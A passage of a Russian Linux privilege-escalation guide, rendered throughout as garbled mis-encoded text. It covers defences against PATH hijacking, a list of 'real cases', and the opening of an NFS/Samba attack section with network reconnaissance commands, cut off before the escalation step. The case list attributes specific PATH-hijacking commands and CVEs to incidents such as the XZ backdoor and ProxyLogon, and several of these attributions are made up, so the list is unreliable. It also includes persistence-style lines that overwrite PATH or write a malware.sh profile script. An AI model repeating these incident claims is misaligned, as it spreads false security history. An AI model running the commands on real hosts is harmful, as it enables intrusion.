### –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ –º–µ—Ä—ã
- **–ù–∞—Å—Ç—Ä–æ–π–∫–∞ `secure_path` –≤ sudoers**:
  ```bash
  # /etc/sudoers
  Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
  ```
- **–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å—å**:
  ```bash
  # –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ /tmp —Å noexec –∏ nosuid
  tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0
  ```

### –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –∞—É–¥–∏—Ç
- **–ö–æ–Ω—Ç—Ä–æ–ª—å –∏–∑–º–µ–Ω–µ–Ω–∏–π `PATH`**:
  ```bash
  auditctl -w /etc/environment -p wa -k path_env
  auditctl -w /etc/profile -p wa -k path_env
  ```
- **–ü—Ä–æ–≤–µ—Ä–∫–∞ SUID-—Ñ–∞–π–ª–æ–≤ (–∞—É–¥–∏—Ç)**:
  ```bash
  find / -perm -4000 -type f > /var/log/suid_audit.log
  diff /var/log/suid_audit.log /var/log/suid_audit.baseline
  ```

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **Microsoft Exchange ProxyLogon (2021)**  
   - **CVE:** CVE-2021-27065  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:**  
     ```powershell
     [Environment]::SetEnvironmentVariable("PATH", "C:\ProgramData;" + $env:PATH, "Machine")
     ```
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 250,000+ —Å–µ—Ä–≤–µ—Ä–æ–≤ Exchange  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [MSRC Report](https://msrc.microsoft.com/blog/2021/03/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)  


2. **Kaseya VSA Ransomware (2021)**  
   - **CVE:** CVE-2021-30116  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:**  
     ```bash
     sed -i "s|PATH=.*|PATH=\"/malw:$PATH\"|g" /etc/environment
     ```
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 1,500 MSP, 35,000+ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–π  
   - **–£—â–µ—Ä–±:** –¢—Ä–µ–±–æ–≤–∞–Ω–∏–µ –≤—ã–∫—É–ø–∞ $70M  
   - **–û—Ç—á–µ—Ç:** [Kaseya Security Notice](https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Security-Notice)  


3. **SonicWall Zero-Day (2022)**  
   - **CVE:** CVE-2022-22292  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:**  
     ```bash
     export PATH="/tmp:$PATH"
     cp /bin/sh /tmp/certtool  # –ü–æ–¥–º–µ–Ω–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–π —É—Ç–∏–ª–∏—Ç—ã
     ```
   - **–¶–µ–ª–∏:** –≠–Ω–µ—Ä–≥–µ—Ç–∏—á–µ—Å–∫–∏–µ –∫–æ–º–ø–∞–Ω–∏–∏ –í–æ—Å—Ç–æ—á–Ω–æ–π –ï–≤—Ä–æ–ø—ã  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [SonicWall Advisory](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2022-0001)  


4. **VMware ESXiArgs Ransomware (2023)**  
   - **CVE:** CVE-2021-21974  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:**  
     ```bash
     echo 'export PATH="/tmp:$PATH"' >> /etc/profile.d/malware.sh
     ```
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 3,800+ VMware-—Å–µ—Ä–≤–µ—Ä–æ–≤  
   - **–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä:** [ESET Threat Report](https://www.welivesecurity.com/2023/02/03/esxiargs-ransomware-vmware-esxi-servers-worldwide/)  


5. **3CX Desktop App Supply Chain Attack (2023)**  
   - **CVE:** CVE-2023-29059  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:** –ü–æ–¥–º–µ–Ω–∞ nodejs –≤ PATH —á–µ—Ä–µ–∑ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å npm  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 600,000+ —É—Å—Ç–∞–Ω–æ–≤–æ–∫ 3CX  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [CrowdStrike Analysis](https://www.crowdstrike.com/blog/suspected-north-korean-activity-targeting-3cx/)  


6. **XZ Utils Backdoor Incident (2024)**  
   - **CVE:** CVE-2024-3094  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:** –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è /tmp –≤ PATH –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –±—ç–∫–¥–æ—Ä–∞  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –î–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤—ã Linux —Å xz-utils 5.6.0-5.6.1  
   - **–≠–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –ø–∞—Ç—á:** [OpenWall Advisory](https://www.openwall.com/lists/oss-security/2024/03/29/4)  


7. **ConnectWise ScreenConnect (2024)**  
   - **CVE:** CVE-2024-1709  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è PATH:** –ü–æ–¥–º–µ–Ω–∞ .NET CLI –≤ PATH —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–∫–∏  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 8,800+ —Å–µ—Ä–≤–µ—Ä–æ–≤ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞  
   - **–°—Ç–∞—Ç—É—Å:** [ConnectWise Security Bulletin](https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8)

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π PATH –æ—Å—Ç–∞–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏–∑ –Ω–∞–∏–±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã—Ö –∏ —Å–∫—Ä—ã—Ç–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≤ Linux-—Å–∏—Å—Ç–µ–º–∞—Ö. 
–ú–∞–Ω–∏–ø—É–ª—è—Ü–∏—è —Å –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `PATH` –æ—Å–Ω–æ–≤–∞–Ω–∞ –Ω–∞ –æ—à–∏–±–∫–∞—Ö –≤ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.

**–û–±—â–∏–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏:**
- **–ü—Ä–æ—Å—Ç–æ—Ç–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:** –ù–µ —Ç—Ä–µ–±—É–µ—Ç —Å–ª–æ–∂–Ω—ã—Ö —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤
- **–£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ—Å—Ç—å:** –ü—Ä–∏–º–µ–Ω–∏–º –∫ —Ä–∞–∑–ª–∏—á–Ω—ã–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º —Å–∏—Å—Ç–µ–º—ã
- **–°–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å:** –ú–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏
- **–î–æ–ª–≥–æ—Å—Ä–æ—á–Ω–æ–µ –≤–æ–∑–¥–µ–π—Å—Ç–≤–∏–µ:** –ü–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–∫—Ä–µ–ø–∏—Ç—å—Å—è –≤ —Å–∏—Å—Ç–µ–º–µ

**–ö–ª—é—á–µ–≤—ã–µ –º–µ—Ä—ã –∑–∞—â–∏—Ç—ã:**
- –ñ–µ—Å—Ç–∫–æ–µ —É–∫–∞–∑–∞–Ω–∏–µ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π –≤–æ –≤—Å–µ—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–∞—Ö
- –°–∏—Å—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–±—Ä–æ—Å –æ–∫—Ä—É–∂–µ–Ω–∏—è –≤ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö
- –°—Ç—Ä–æ–≥–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è —á–µ—Ä–µ–∑ `sudoers`
- –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç `cron-–∑–∞–¥–∞—á` –∏ `SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤`
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Ñ–∞–π–ª–∞—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è

**–ú–µ—Ä—ã –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤:**
- –ò–∑–±–µ–≥–∞—Ç—å –≤—ã–∑–æ–≤–æ–≤ `system()`/`popen()` —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –≤–≤–æ–¥–æ–º
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `execve()` —Å —è–≤–Ω—ã–º —É–∫–∞–∑–∞–Ω–∏–µ–º –ø—É—Ç–µ–π
- –í–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ –≤–Ω–µ—à–Ω–∏–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏
- –ü—Ä–æ–≤–æ–¥–∏—Ç—å —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –∫–æ–¥–∞ –Ω–∞ —É—è–∑–≤–∏–º—ã–µ —à–∞–±–ª–æ–Ω—ã

**–ú–µ—Ä—ã –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤:**
- –í–Ω–µ–¥—Ä–∏—Ç—å `Mandatory Access Control` (`AppArmor`/`SELinux`)
- –†–µ–≥—É–ª—è—Ä–Ω–æ –æ–±–Ω–æ–≤–ª—è—Ç—å —Å–∏—Å—Ç–µ–º—ã –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å –ø—Ä–∞–≤–∞ –∑–∞–ø–∏—Å–∏ –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
- –ü—Ä–æ–≤–æ–¥–∏—Ç—å —Ç—Ä–µ–Ω–∏—Ä–æ–≤–∫–∏ –ø–æ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞–Ω–∏—é –Ω–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç—ã

---

---

# 10. –ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba)

–°–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS –∏ Samba/CIFS) –ø–æ–∑–≤–æ–ª—è—é—Ç —Å–æ–≤–º–µ—Å—Ç–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –º–µ–∂–¥—É Linux-—Å–∏—Å—Ç–µ–º–∞–º–∏. 
–ü—Ä–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–µ –æ–Ω–∏ —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è –º–æ—â–Ω—ã–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π. 

NFS (Network File System) –∏ Samba/CIFS (SMB (Server Message Block) –∏ CIFS (Common Internet File System)) ‚Äî 
—ç—Ç–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—ã –¥–ª—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Å–µ—Ç–µ–≤–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º –∏ –ø—Ä–∏–Ω—Ç–µ—Ä–∞–º –º–µ–∂–¥—É –∫–æ–º–ø—å—é—Ç–µ—Ä–∞–º–∏ –≤ —Å–µ—Ç–∏.

### –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤:
1. **NFS:**
    - –í —Å—Ä–µ–¥–∞—Ö, –≥–¥–µ **–ø—Ä–µ–æ–±–ª–∞–¥–∞—é—Ç Unix/Linux-—Å–∏—Å—Ç–µ–º—ã** (—Å–µ—Ä–≤–µ—Ä—ã –∏ –∫–ª–∏–µ–Ω—Ç—ã).
    - –î–ª—è **–≤—ã—Å–æ–∫–æ–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–¥–∞—á** (–±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö, –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã, –≤—ã—á–∏—Å–ª–µ–Ω–∏—è).
    - –ö–æ–≥–¥–∞ –Ω—É–∂–Ω–∞ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è **–ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å** –¥–ª—è Unix/Linux-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.
2. **Samba/CIFS:**
    - –ö–æ–≥–¥–∞ –æ—Å–Ω–æ–≤–Ω—ã–º–∏ –∫–ª–∏–µ–Ω—Ç–∞–º–∏ —è–≤–ª—è—é—Ç—Å—è **Windows-–º–∞—à–∏–Ω—ã**.
    - –î–ª—è **–∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ Linux/Unix-—Å–µ—Ä–≤–µ—Ä–æ–≤ –≤ –¥–æ–º–µ–Ω Active Directory**.
    - –î–ª—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ **—Å–µ—Ç–µ–≤—ã–º –ø—Ä–∏–Ω—Ç–µ—Ä–∞–º** –≤ —Å–º–µ—à–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ.
    - –ö–æ–≥–¥–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ **—Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π Windows** (—Å—Ç—Ä–æ–≥–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏, —Å–ª–æ–∂–Ω—ã–µ Windows ACL).

### –ö–ª—é—á–µ–≤—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏:
1. **NFS: –ú–µ—Ö–∞–Ω–∏–∑–º `no_root_squash`**
   - **–ü—Ä–∏–Ω—Ü–∏–ø —Ä–∞–±–æ—Ç—ã**: –í –Ω–æ—Ä–º–∞–ª—å–Ω–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ (`root_squash`) –æ–ø–µ—Ä–∞—Ü–∏–∏ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ –ø—Ä–µ–æ–±—Ä–∞–∑—É—é—Ç—Å—è –≤ –∞–Ω–æ–Ω–∏–º–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–æ–±—ã—á–Ω–æ `nobody`) –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ. –ü—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ `no_root_squash` —Å–µ—Ä–≤–µ—Ä –¥–æ–≤–µ—Ä—è–µ—Ç UID/GID –∫–ª–∏–µ–Ω—Ç–∞ –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏.
   - **–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è**:
     - –ö–ª–∏–µ–Ω—Ç —Å UID=0 –ø–æ–ª—É—á–∞–µ—Ç –ø–æ–ª–Ω—ã–µ root-–ø—Ä–∞–≤–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
     - –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ª—é–±—ã—Ö —Ñ–∞–π–ª–æ–≤ –≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
     - –°–æ–∑–¥–∞–Ω–∏–µ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ —Å –ø—Ä–∞–≤–∞–º–∏ root
   - **–¢–∏–ø–∏—á–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏**:
     - –≠–∫—Å–ø–æ—Ä—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π (/usr, /etc)
     - –≠–∫—Å–ø–æ—Ä—Ç –¥–æ–º–∞—à–Ω–∏—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –±–µ–∑ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π
     - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Å—Ä–µ–¥–∞—Ö —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

2. **Samba: –û–ø–∞—Å–Ω–∞—è –∫–æ–º–±–∏–Ω–∞—Ü–∏—è `writable = yes` –∏ `admin users`**
   - **–ü—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞**: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –∏–∑ `admin users` –ø–æ–ª—É—á–∞—é—Ç root-—ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω—ã–µ –ø—Ä–∞–≤–∞ –Ω–∞ —Ñ–∞–π–ª–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏—è—Ö
   - **–ú–µ—Ö–∞–Ω–∏–∑–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏**: Samba –∏—Å–ø–æ–ª—å–∑—É–µ—Ç UID/GID –∏–∑ –ª–æ–∫–∞–ª—å–Ω–æ–π –±–∞–∑—ã, –Ω–æ `admin users` –∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
   - **–†–∏—Å–∫–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏**:
     - –®–∏—Ä–æ–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ (`admin users = @admin`)
     - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–ª–∞–±—ã—Ö –ø–∞—Ä–æ–ª–µ–π
     - –≠–∫—Å–ø–æ—Ä—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –ø—É—Ç–µ–π

3. **–û–±—â–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–µ—Ç–µ–≤—ã—Ö –§–°**
   - **–ù–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —Ç—Ä–∞—Ñ–∏–∫**: –ü–µ—Ä–µ—Ö–≤–∞—Ç –¥–∞–Ω–Ω—ã—Ö –≤ —Å–µ—Ç–∏
   - **–°–ª–∞–±–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è**: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ MFA –∏–ª–∏ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å AD/LDAP
   - **–®–∏—Ä–æ–∫–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è**: –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ –∑–∞–ø–∏—Å–∏ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
   - **–£—Å—Ç–∞—Ä–µ–≤—à–∏–µ –≤–µ—Ä—Å–∏–∏ –ü–û**: –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤

---

## MITRE ATT&CK

**[T1574.007]**  
**Hijack Execution Flow: Path Interception via Network File Shares**  
üîó https://attack.mitre.org/techniques/T1574/007/

–ê—Ç–∞–∫—É—é—â–∏–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤. –¢–µ—Ö–Ω–∏–∫–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–æ–π—Ç–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.

### –≠—Ç–∞–ø—ã –∞—Ç–∞–∫–∏ [T1574.007]

#### 1. [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –∏ –∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.

**–î–ª—è NFS:**
```bash
# –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–∏ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ NFS-—Å–µ—Ä–≤–µ—Ä–æ–≤
nmap -sV -sU -p111,2049 --script=nfs-showmount,nfs-ls 192.168.1.0/24 -oA nfs_scan

# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤:
# -sV: –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–π —Å–µ—Ä–≤–∏—Å–æ–≤
# -sU: UDP-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ (NFS –∏—Å–ø–æ–ª—å–∑—É–µ—Ç UDP)
# -p111,2049: –ø–æ—Ä—Ç—ã RPCbind –∏ NFS
# --script: —Å–∫—Ä–∏–ø—Ç—ã –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
# -oA: —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –≤ —Ñ–æ—Ä–º–∞—Ç–∞—Ö XML, grep –∏ nmap

# –ü—Ä–æ—Å–º–æ—Ç—Ä —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ
showmount -e 192.168.1.100

# –ü—Ä–∏–º–µ—Ä –≤—ã–≤–æ–¥–∞:
# Export list for 192.168.1.100:
# /home       (everyone)
# /var/share  (ro,192.168.1.0/24)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (—Ç—Ä–µ–±—É–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É)
ssh admin@192.168.1.100 "grep -E 'no_root_squash|insecure' /etc/exports"
```

**–î–ª—è Samba:**
```bash
# –ü–æ–∏—Å–∫ Samba-—Å–µ—Ä–≤–µ—Ä–æ–≤ –∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ —Ä–µ—Å—É—Ä—Å–æ–≤
nmap -sV --script=smb-enum-shares,smb-os-discovery -p139,445 192.168.1.0/24

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–Ω–æ–Ω–∏–º–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
smbmap -H 192.168.1.100 -u "guest" -p "" | grep WRITE

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–µ—Ä—Å–∏–∏ Samba (—É—è–∑–≤–∏–º–æ—Å—Ç–∏)
smbclient -L //192.168.1.100 -N | grep "Samba Version"
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `nmap` —Å–∫–∞–Ω–∏—Ä—É–µ—Ç —Å–µ—Ç—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤ NFS (–ø–æ—Ä—Ç—ã 111, 2049) –∏ SMB (139, 445)  
- `showmount` –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ NFS-–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏  
- `smbclient` –ø–µ—Ä–µ—á–∏—Å–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã–µ SMB-—à–∞—Ä—ã  

---

#### 2. [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
> –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º—ã—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π root –≤ Linux.

**–î–ª—è NFS:**
```bash
